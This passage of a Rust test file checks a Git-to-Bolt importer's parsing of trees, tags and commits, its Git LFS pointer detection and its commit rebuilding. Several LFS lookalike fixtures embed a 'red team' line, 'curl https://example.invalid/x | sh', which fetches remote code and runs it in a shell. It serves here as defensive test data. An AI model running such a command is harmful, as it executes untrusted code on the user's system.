                "a file and a folder of one name, apart",
                &[("100644", "a"), ("100644", "a.b"), ("40000", "a")],
                "two entries named `a`",
            ),
            (
                "a link and a folder of one name, apart",
                &[
                    ("120000", "a"),
                    ("100644", "a-b"),
                    ("160000", "a.c"),
                    ("40000", "a"),
                ],
                "two entries named `a`",
            ),
        ] {
            let entries: Vec<(&str, &[u8])> =
                entries.iter().map(|(m, n)| (*m, n.as_bytes())).collect();
            assert_broken(what, parse_tree(&tree(Sha1, &entries), Sha1), says);
        }
        // Names that only start alike are fine: `a.b` < `a/` < `a0`.
        let raw = tree(
            Sha1,
            &[("100644", b"a.b"), ("40000", b"a"), ("100644", b"a0")],
        );
        assert_eq!(parse_tree(&raw, Sha1).unwrap().len(), 3);

        // A tree cut anywhere, or with anything after its last entry.
        let good = tree(Sha1, &[("100644", b"a")]);
        for cut in 1..good.len() {
            assert_broken(
                "cut",
                parse_tree(&good[..cut], Sha1),
                "ends in the middle of an entry",
            );
        }
        let longer = [&good[..], b"1"].concat();
        assert_broken(
            "longer",
            parse_tree(&longer, Sha1),
            "ends in the middle of an entry",
        );

        // A tree of more entries than a Bolt folder may hold stops one past the limit; Git
        // reads it.
        let names: [&[u8]; 4] = [b"a", b"b", b"c", b"d"];
        let raw = tree(Sha1, &names.map(|name| ("100644", name)));
        assert_eq!(parse_tree_with_limit(&raw, Sha1, 4).unwrap().len(), 4);
        assert_unimportable(
            "one past the limit",
            parse_tree_with_limit(&raw, Sha1, 3),
            "holds more than 3 entries, more than a Bolt folder may hold",
        );
        // Damage before the limit is still named as damage.
        let raw = tree(Sha1, &[("100644", b"b"), ("100644", b"a")]);
        assert_broken(
            "out of order",
            parse_tree_with_limit(&raw, Sha1, 1),
            "out of",
        );

        // Which names Bolt can take is the importer's call (decision 035), so all come back.
        let names: [&[u8]; 7] = [b"", b".", b"..", b".git", b"a/b", b"\xff", b"\xff/"];
        let raw = tree(Sha1, &names.map(|name| ("100644", name)));
        let got: Vec<&[u8]> = parse_tree(&raw, Sha1)
            .unwrap()
            .iter()
            .map(|e| e.name)
            .collect();
        assert_eq!(got, names);

        // Names in messages are escaped, and a long one is cut.
        let raw = tree(Sha1, &[("100644", HOSTILE.as_bytes()), ("100644", b"a")]);
        assert_hostile_text_escaped(&parse_tree(&raw, Sha1).unwrap_err().to_string());
        let long = vec![b'b'; 100_000];
        let raw = tree(Sha1, &[("100644", &long), ("100644", b"a")]);
        let message = parse_tree(&raw, Sha1).unwrap_err().to_string();
        assert!(message.len() < 400, "{message}");
        assert!(
            message.contains(&format!("`{}...`", "b".repeat(255))),
            "{message}"
        );
    }

    #[test]
    fn tags_parse() {
        let object = "5e1f0a7d9c3b2486e0d4a1b7c9f3e5d2a8b6c4e0";
        let signed = format!(
            "object {object}\ntype commit\ntag v1.0\ntagger Vera Toll <t@example.com> 1601234500 \
             +0000\n\nVersion 1.0\n-----BEGIN PGP SIGNATURE-----\n\niHUEABYKAB0WIQRNmrJ5\n\
             -----END PGP SIGNATURE-----\n"
        );
        assert_eq!(
            parse_tag(signed.as_bytes(), Sha1).unwrap(),
            TagObject {
                object: id(Sha1, object),
                kind: ObjectType::Commit,
                name: b"v1.0",
                message: b"Version 1.0\n-----BEGIN PGP SIGNATURE-----\n\niHUEABYKAB0WIQRNmrJ5\n\
                           -----END PGP SIGNATURE-----\n",
            }
        );
        // Early tags have no tagger; a tag may name a tree, a blob or another tag; other headers
        // (a signature over the SHA-256 form, say) may follow.
        // The hash, the tag, and its type, name and message.
        type Case<'a> = (HashKind, String, ObjectType, &'a [u8], &'a [u8]);
        let cases: [Case; 4] = [
            (
                Sha1,
                format!(
                    "object {object}\ntype tree\ntag snapshot-3-tree\n\n\
                     The tree as it stood at snapshot 3.\n"
                ),
                ObjectType::Tree,
                b"snapshot-3-tree",
                b"The tree as it stood at snapshot 3.\n",
            ),
            (
                Sha1,
                format!("object {object}\ntype blob\ntag \n\n"),
                ObjectType::Blob,
                b"",
                b"",
            ),
            (
                Sha1,
                format!(
                    "object {object}\ntype tag\ntag outer\ntagger T <t@x> 1 +0000\n\
                     gpgsig-sha256 -----BEGIN PGP SIGNATURE-----\n \n abc\n \
                     -----END PGP SIGNATURE-----\n\nouter\n"
                ),
                ObjectType::Tag,
                b"outer",
                b"outer\n",
            ),
            (
                Sha256,
                format!(
                    "object {}\ntype commit\ntag v1\n\nm",
                    TREE_256.to_uppercase()
                ),
                ObjectType::Commit,
                b"v1",
                b"m",
            ),
        ];
        for (hash, raw, kind, name, message) in cases {
            let tag = parse_tag(raw.as_bytes(), hash).unwrap_or_else(|e| panic!("{raw}: {e}"));
            assert_eq!(
                (tag.kind, tag.name, tag.message),
                (kind, name, message),
                "{raw}"
            );
        }

        let head = format!("object {object}\ntype commit\ntag v1\n");
        for (what, raw, says) in [
            (
                "no object line",
                "type commit\ntag v1\n\nm".to_owned(),
                "`object` line",
            ),
            (
                "a bad object ID",
                format!("object {}\ntype commit\ntag v1\n\nm", &object[1..]),
                "`object` line",
            ),
            (
                "no type line",
                format!("object {object}\ntag v1\n\nm"),
                "no `type` line",
            ),
            (
                "an unknown type",
                format!("object {object}\ntype banana\ntag v1\n\nm"),
                "`banana`",
            ),
            (
                "no tag line",
                format!("object {object}\ntype commit\n\nm"),
                "no `tag` line",
            ),
            (
                "a NUL in the header",
                format!("{head}tagger T\0 <t@x> 1 +0000\n\nm"),
                "NUL",
            ),
            (
                "a header cut off inside a line",
                format!("{head}tagger T"),
                "ends inside its header",
            ),
            (
                "no tag line and no empty line",
                format!("object {object}\ntype commit\n"),
                "no `tag` line",
            ),
        ] {
            assert_broken(what, parse_tag(raw.as_bytes(), Sha1), says);
        }
        // Tags Git reads, and `git fsck` passes, that Bolt can't take as they are.
        for (what, raw, says) in [
            ("no empty line", head.clone(), "no empty line"),
            (
                "a continuation of nothing",
                format!("{head} stray\n\nm"),
                "continue",
            ),
            (
                "a header without a value",
                format!("{head}x-tool\n\nm"),
                "a key and a value",
            ),
        ] {
            assert_unimportable(what, parse_tag(raw.as_bytes(), Sha1), says);
        }
        let raw = format!("object {object}\ntype {HOSTILE}\ntag v1\n\nm");
        assert_hostile_text_escaped(&parse_tag(raw.as_bytes(), Sha1).unwrap_err().to_string());
    }

    #[test]
    fn the_exact_form_is_what_git_lfs_writes() {
        let oid = "4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393";
        let exact =
            format!("version https://git-lfs.github.com/spec/v1\noid sha256:{oid}\nsize 12345\n");
        let p = lfs_pointer(exact.as_bytes()).unwrap();
        assert!(is_exact_lfs_pointer(exact.as_bytes(), &p));
        for (what, data) in [
            ("a blank line", exact.replace("\noid", "\n\noid")),
            ("a space before it", format!(" {exact}")),
            (
                "the pre-release version",
                exact.replace("git-lfs.github.com", "hawser.github.com"),
            ),
            ("a size with a plus sign", exact.replace("12345", "+12345")),
            ("a zero-padded size", exact.replace("12345", "012345")),
            (
                "an extension",
                exact.replace(
                    "\noid",
                    &format!("\next-0-foo sha256:{}\noid", "f".repeat(64)),
                ),
            ),
        ] {
            let p = lfs_pointer(data.as_bytes()).unwrap();
            assert!(!is_exact_lfs_pointer(data.as_bytes(), &p), "{what}");
        }
        // Another pointer's bytes aren't this one's.
        let other = lfs_pointer(exact.replace("12345", "1").as_bytes()).unwrap();
        assert!(!is_exact_lfs_pointer(exact.as_bytes(), &other));
        // Git LFS keeps an empty file as an empty blob, never as a pointer of size 0.
        let empty = exact.replace("12345", "0");
        let p = lfs_pointer(empty.as_bytes()).unwrap();
        assert!(!is_exact_lfs_pointer(empty.as_bytes(), &p));
    }

    #[test]
    fn files_that_look_like_lfs_pointers() {
        let oid = "4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393";
        let v1 = "version https://git-lfs.github.com/spec/v1\n";
        let pointer = format!("{v1}oid sha256:{oid}\nsize 12345\n");
        let padded = format!("{pointer}{}", "\n".repeat(1024 - pointer.len()));
        for (what, data, want) in [
            ("a pointer", pointer.clone(), true),
            (
                "the pre-release version",
                pointer.replace("git-lfs.github.com", "hawser.github.com"),
                true,
            ),
            // Git LFS reads neither of these as a pointer.
            (
                "a line after the size",
                format!("{pointer}and more\n"),
                true,
            ),
            (
                "keys out of order",
                format!("{v1}size 12345\noid sha256:{oid}\n"),
                true,
            ),
            (
                "an oid in capitals",
                pointer.replace(oid, &oid.to_uppercase()),
                true,
            ),
            (
                "more after the version",
                pointer.replace("v1\n", "v1.5 \n"),
                true,
            ),
            (
                "a size that isn't a number",
                pointer.replace("12345", "big"),
                true,
            ),
            ("CRLF", pointer.replace('\n', "\r\n"), true),
            ("1,024 bytes", padded.clone(), true),
            ("an empty file", String::new(), false),
            ("1,025 bytes", format!("{padded}\n"), false),
            // Git LFS's alpha's pointers are its own test's to find.
            (
                "the alpha version",
                pointer.replace(
                    "https://git-lfs.github.com/spec/v1",
                    "http://git-media.io/v/2",
                ),
                false,
            ),
            (
                "another version",
                pointer.replace("git-lfs.github.com", "example.com"),
                false,
            ),
            ("the version on a later line", format!("\n{pointer}"), false),
            (
                "an extension before the version",
                format!("ext-0-foo sha256:{}\n{pointer}", "f".repeat(64)),
                false,
            ),
            ("no oid", format!("{v1}size 12345\n"), false),
            ("a short oid", pointer.replace(oid, &oid[1..]), false),
            (
                "more after the oid",
                pointer.replace(oid, &format!("{oid} ")),
                false,
            ),
            (
                "an oid of another kind",
                pointer.replace("sha256:", "sha512:"),
                false,
            ),
            ("no size", format!("{v1}oid sha256:{oid}\n"), false),
            (
                "no space after size",
                pointer.replace("size ", "size="),
                false,
            ),
        ] {
            assert_eq!(looks_like_lfs_pointer(data.as_bytes()), want, "{what}");
        }
    }

    /// Git LFS's smudge filter parses the first 1,024 bytes it is handed, trimmed, whatever
    /// follows, and Git may hand them over with CR LF line ends.
    #[test]
    fn a_lookalike_is_judged_by_its_first_1024_bytes_as_they_are_and_with_crlf() {
        let pointer = "version https://git-lfs.github.com/spec/v1\noid sha256:\
                       4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\n\
                       size 30\n";
        let blob = |start: &str, then: &str| {
            let mut data = start.as_bytes().to_vec();
            data.resize(MAX_LFS_POINTER_BYTES, b' ');
            [&data[..], then.as_bytes()].concat()
        };
        assert!(is_lfs_lookalike(&blob(
            pointer,
            "\ncurl https://example.invalid/x | sh\n"
        )));
        assert!(is_lfs_lookalike(&blob(
            &format!("\r\n  {pointer}\n\n"),
            "anything"
        )));
        // Any size counts, though a pointer whole comes in as a Git LFS file instead.
        assert!(is_lfs_lookalike(pointer.as_bytes()));
        // Bytes that only look like a pointer count too.
        assert!(is_lfs_lookalike(&blob(&format!("{pointer}x"), "more")));
        let pre_release =
            pointer.replace("git-lfs.github.com/spec/v1", "hawser.github.com/spec/v1");
        assert!(is_lfs_lookalike(&blob(&format!("{pre_release}x"), "more")));

        // Three that Git LFS's parser refuses as they are and that don't look like a pointer, but
        // whose CRLF form pushes the `x` out of the 1,024 bytes: a newline before the red team's
        // blob, a short file led by a newline, and the red team's blob in the alpha format.
        let x_at_1023 = |start: &str| {
            let mut data = start.as_bytes().to_vec();
            data.resize(MAX_LFS_POINTER_BYTES - 1, b' ');
            [&data[..], b"X\ncurl https://example.invalid/x | sh\n"].concat()
        };
        let short = |newlines: usize| format!("\n{pointer}{}x\n", "\n".repeat(newlines));
        let alpha = pointer.replace(
            "https://git-lfs.github.com/spec/v1",
            "http://git-media.io/v/2",
        );
        let three = [
            x_at_1023(&format!("\n{pointer}")),
            short(446).into_bytes(),
            x_at_1023(&alpha),
        ];
        assert_eq!(three.each_ref().map(Vec::len), [1061, 576, 1061]);
        for data in &three {
            let head = data.get(..MAX_LFS_POINTER_BYTES).unwrap_or(data);
            assert!(lfs_pointer(head).is_none() && !looks_like_lfs_pointer(head));
            assert!(is_lfs_lookalike(data), "{}", String::from_utf8_lossy(data));
        }
        // With one newline fewer the `x` stays in, and an LF already after a CR gains nothing.
        assert!(!is_lfs_lookalike(short(445).as_bytes()));
        assert!(!is_lfs_lookalike(&x_at_1023(&alpha.replace('\n', "\r\n"))));

        // What doesn't look like one in the first 1,024 bytes, whatever follows them.
        let late = format!("{}{pointer}", " ".repeat(MAX_LFS_POINTER_BYTES - 20));
        assert!(!is_lfs_lookalike(late.as_bytes()));
        assert!(!is_lfs_lookalike(&blob("", pointer)));
        assert!(!is_lfs_lookalike(&blob(
            &pointer.replace("size ", "size="),
            "more"
        )));
    }

    /// The 1,024 bytes of a CRLF form can end between a CR and its LF: Git LFS trims the CR left
    /// at the end, so the pointer still counts.
    #[test]
    fn a_crlf_pair_cut_at_1024_bytes_leaves_a_cr_that_is_trimmed() {
        let pointer = "version https://git-lfs.github.com/spec/v1\noid sha256:\
                       4d7a214614ab2935c943f9e0ff69d22eadbb8f32b1258daaa5e2ca24d17e2393\n\
                       size 30\n";
        // The LF at 1,019 has four LFs before it, so in the CRLF form its CR is byte 1,023 and
        // the LF byte 1,024, past the cut, with the `XXXX` after it.
        let mut data = format!("\n{pointer}").into_bytes();
        data.resize(MAX_LFS_POINTER_BYTES - 5, b' ');
        data.extend_from_slice(b"\nXXXX\ncurl https://example.invalid/x | sh\n");
        let head = &data[..MAX_LFS_POINTER_BYTES];
        assert_eq!(head.iter().filter(|&&b| b == b'\n').count(), 5);
        assert_eq!(&head[1019..], b"\nXXXX");
        assert!(lfs_pointer(head).is_none() && !looks_like_lfs_pointer(head));
        assert!(is_lfs_lookalike(&data));
    }

    /// What the importer makes of a commit, without storing it: people and message as they
    /// convert, and `git-header` only when the standard form doesn't give the commit back.
    fn save_from_commit_fields(c: &Commit, hash: HashKind) -> Save {
        let raw = [c.header, b"\n", c.message].concat();
        let id = object_id(ObjectType::Commit, &raw, hash).unwrap();
        let message = String::from_utf8_lossy(c.message).into_owned();
        let mut extra = BTreeMap::from([(EXTRA_GIT_COMMIT.to_owned(), id.to_hex().into_bytes())]);
        if message.as_bytes() != c.message {
            extra.insert(EXTRA_GIT_ORIGINAL_MESSAGE.to_owned(), c.message.to_vec());
        }
        let mut save = Save {
            root: Id([0; 32]),
            parents: Vec::new(),
            author: parse_person(c.author),
            saver: parse_person(c.committer),
            message,
            change_id: ChangeId([0; 16]),
            move_notes: Vec::new(),
            signature: Vec::new(),
            extra,
        };
        if rebuild_commit(&save, &c.tree, &c.parents) != raw {
            save.extra
                .insert(EXTRA_GIT_HEADER.to_owned(), c.header.to_vec());
        }
        save
    }

    #[test]
    fn a_standard_commit_rebuilds_without_git_header() {
        let parent_256 = "6230c9b97162440b78b8dc5601e48ec3974574fbafe81baff53aa1d7f4baeb35";
        let first = "cc9c65860c20d54b080b52ee21db2583360e6e2c";
        // What, the hash, the commit, and its ID if Git made it (`git commit-tree` with these
        // dates).
        let cases = [
            (
                "a root commit",
                Sha1,
                commit(TREE, &[], "", b"first\n"),
                Some(first),
            ),
            (
                "a second commit",
                Sha1,
                commit(TREE, &[first.to_owned()], "", b"second\n\nbody\n"),
                Some("9bb66b4c269a6c581f665428dae41e5eb4b6ce18"),
            ),
            (
                "a SHA-256 commit",
                Sha256,
                commit(TREE_256, &[parent_256.to_owned()], "", b"second\n\nbody\n"),
                Some("acf2103adf5367d0b44724c3d2256675037b592f8822de1a41e28f0340513199"),
            ),
            (
                "a merge",
                Sha1,
                commit(TREE, &[nth(1), nth(2), nth(3)], "", b"Merge\n"),
                None,
            ),
            ("an empty message", Sha1, commit(TREE, &[], "", b""), None),
            (
                "a message that isn't UTF-8",
                Sha1,
                commit(TREE, &[], "", b"caf\xe9\n"),
                None,
            ),
            (
                "zones far east and west",
                Sha1,
                authored(b"A <a@b> 4102444800 +1400"),
                None,
            ),
            (
                "a person without a name or email",
                Sha1,
                authored(b" <> 0 -1200"),
                None,
            ),
            (
                "a zone west, not in whole hours",
                Sha1,
                authored(b"A <a@b> 1 -0330"),
                None,
            ),
        ];
        for (what, hash, raw, git_id) in cases {
            let c = parse_commit(&raw, hash).unwrap();
            let save = save_from_commit_fields(&c, hash);
            assert!(!save.extra.contains_key(EXTRA_GIT_HEADER), "{what}");
            let rebuilt = rebuild_commit(&save, &c.tree, &c.parents);
            assert_eq!(rebuilt, raw, "{what}");
            if let Some(git_id) = git_id {
                assert_eq!(
                    object_id(ObjectType::Commit, &rebuilt, hash)
                        .unwrap()
                        .to_hex(),
                    git_id
                );
            }
        }
        // A time before 1970 rounds down to whole seconds: -1.5 s is -2 and -1 ms is -1.
        let person = |time_ms| Person {
            name: "A".into(),
            email: "a@b".into(),
            time_ms,
            tz_offset_min: 0,
        };
        let save = Save {
            root: Id([0; 32]),
            parents: Vec::new(),
            author: person(-1500),
            saver: person(-1),
            message: "m".into(),
            change_id: ChangeId([0; 16]),
            move_notes: Vec::new(),
            signature: Vec::new(),
            extra: BTreeMap::new(),
        };
        let want = format!("tree {TREE}\nauthor A <a@b> -2 +0000\ncommitter A <a@b> -1 +0000\n\nm");
        assert_eq!(rebuild_commit(&save, &id(Sha1, TREE), &[]), want.as_bytes());
    }

    #[test]
    fn an_unusual_commit_rebuilds_from_git_header() {
        for (what, raw) in [
            ("a signature", commit(TREE, &[nth(1)], GPGSIG, b"signed\n")),
            (
                "a signed merge",
                commit(TREE, &[nth(1), nth(2)], MERGETAG, b"Merge\n"),
            ),
            (
                "an encoding",
                commit(TREE, &[], "encoding ISO-8859-1\n", b"caf\xe9\n"),
            ),
            (
                "a change-id",
                commit(
                    TREE,
                    &[],
                    "change-id zyxwvutsrqponmlkzyxwvutsrqponmlk\n",
                    b"m",
                ),
            ),
            (
                "a -0000 zone",
                authored(b"Ida Lark <ida.lark@example.com> 1601234567 -0000"),
            ),
            (
                "two spaces before the email",
                authored(b"Ida Lark  <ida.lark@example.com> 1601234567 -0400"),
            ),
            (
                "no space before the email",
                authored(b"Ida Lark<ida.lark@example.com> 1601234567 -0400"),
            ),
            ("no email", authored(b"Ida Lark 1601234567 -0400")),
            ("no time", authored(b"Ida Lark <ida.lark@example.com>")),
            ("a zero-padded time", authored(b"A <a@b> 01601234567 -0700")),
            (
                "a time past what Bolt holds",
                authored(b"A <a@b> 99999999999999999999 +0000"),
            ),
            ("a zone of five digits", authored(b"A <a@b> 1 +05300")),
            ("minutes past 59", authored(b"A <a@b> 1 +0075")),
            ("text after the zone", authored(b"A <a@b> 1 +0000 x")),
            (
                "a name that isn't UTF-8",
                authored(b"Ren\xe9 <r@x> 1 +0000"),
            ),
            (
                "a tree ID in capitals",
                commit(&TREE.to_uppercase(), &[], "", b"m"),
            ),
        ] {
            let c = parse_commit(&raw, Sha1).unwrap();
            let save = save_from_commit_fields(&c, Sha1);
            assert_eq!(
                save.extra.get(EXTRA_GIT_HEADER).map(Vec::as_slice),
                Some(c.header),
                "{what}"
            );
            assert_eq!(rebuild_commit(&save, &c.tree, &c.parents), raw, "{what}");
        }
        // The message bytes come from `git-original-message` when the save has it.
        let raw = commit(TREE, &[], "", b"caf\xe9\n");
        let c = parse_commit(&raw, Sha1).unwrap();
        let mut save = save_from_commit_fields(&c, Sha1);
        save.extra
            .insert(EXTRA_GIT_ORIGINAL_MESSAGE.to_owned(), b"other".to_vec());
        assert!(rebuild_commit(&save, &c.tree, &c.parents).ends_with(b"\n\nother"));
    }
}
